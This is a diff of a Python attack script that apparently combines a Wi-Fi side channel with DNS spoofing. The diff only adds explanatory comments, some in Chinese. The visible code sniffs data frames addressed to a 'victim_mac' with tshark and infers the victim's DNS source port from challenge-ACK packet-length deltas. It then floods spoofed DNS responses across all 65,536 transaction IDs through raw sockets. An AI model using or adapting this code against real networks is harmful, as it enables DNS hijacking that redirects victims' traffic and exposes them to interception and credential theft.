@@ -20,6 +20,7 @@ all_time = 0
 def listen_packets(packet_lengths, lock):
     global victim_mac, NIC
     cmd = f"sudo tshark -i {NIC} -Y \"(wlan.fc.type == 2) && (wlan.da == {victim_mac})\" -T fields -e frame.len -l"
+    # 只捕获数据帧和受害者的mac地址
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     print("start listening")
     try:
@@ -38,8 +39,8 @@ def check_consecutive_lengths(packet_lengths):
     packet_lengths.sort()
     print(packet_lengths)
     for i in range(len(packet_lengths) - 1):
-        if packet_lengths[i + 1] - packet_lengths[i] == CHALLENGE_ACK_LENGTH:
-            return True, packet_lengths[i + 1]
+        if packet_lengths[i + 1] - packet_lengths[i] == CHALLENGE_ACK_LENGTH: # delta
+            return True, packet_lengths[i + 1] # 用tshark持续抓包，只要出现delta len == CHALLENGE_ACK_LENGTH
     return False, 0
 
 
@@ -71,7 +72,7 @@ def guess_src_port_multi_bin():
         padding_lengths = []
         for i in range(round * one_round_per_bin, min((round + 1) * one_round_per_bin, bin_num)):
             current_ports += bins[i]
-            padding_lengths += [i - round * one_round_per_bin] * len(bins[i])
+            padding_lengths += [i - round * one_round_per_bin] * len(bins[i]) # 通过填充长度来「标记」index
         
         with lock:
             packet_lengths[:] = []
@@ -110,10 +111,10 @@ def guess_src_port_multi_bin():
 
 def inject_dns_response():
     global src_ip, dst_ip, src_port, dst_port
-    txids = list(range(0, 0x10000))
+    txids = list(range(0, 0x10000)) # all possible transaction IDs
     random.shuffle(txids)
     rs = Rawsockets(dst_ip.encode('utf-8'), src_ip.encode('utf-8'), 0)
-    rs.send_parallel_dns_response(dst_port, src_port, txids)
+    rs.send_parallel_dns_response(dst_port, src_port, txids) # brute force all txids
     del(rs)
 
 if __name__ == "__main__":
